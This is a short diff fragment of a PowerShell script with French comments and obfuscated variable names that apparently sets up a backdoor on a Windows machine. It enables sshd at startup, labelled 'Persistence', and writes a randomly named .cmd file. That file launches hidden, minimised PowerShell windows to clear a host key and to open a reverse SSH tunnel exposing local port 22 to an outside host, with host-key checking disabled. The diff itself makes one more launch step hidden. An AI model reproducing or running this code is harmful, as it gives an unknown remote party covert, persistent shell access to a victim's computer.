@@ -93,7 +93,7 @@ Set-Service -Name sshd -StartupType 'Automatic' # Persistence
 $GlNweBEFmh = Get-RandomAlphanumericString
 $NyZnoLKCIs = Get-Location
 Add-Content -Path "$NyZnoLKCIs/$GlNweBEFmh.cmd" -Value "@echo off"
-Add-Content -Path "$NyZnoLKCIs/$GlNweBEFmh.cmd" -Value "powershell -Command `"ssh-keygen -R $ecPlmJVLRo`""
+Add-Content -Path "$NyZnoLKCIs/$GlNweBEFmh.cmd" -Value "start /min powershell.exe -windowstyle hidden -Command `"ssh-keygen -R $ecPlmJVLRo`""
 Add-Content -Path "$NyZnoLKCIs/$GlNweBEFmh.cmd" -Value "start /min powershell.exe -windowstyle hidden -Command `"ssh -o ServerAliveInterval=30 -o StrictHostKeyChecking=no -R $YlEQgBmePn`:localhost:22 $dERQpoZWxz -i `$env:temp\key`""
 
 # Fonction pour supprimer les lignes contenant l'adresse IP dans known_hosts
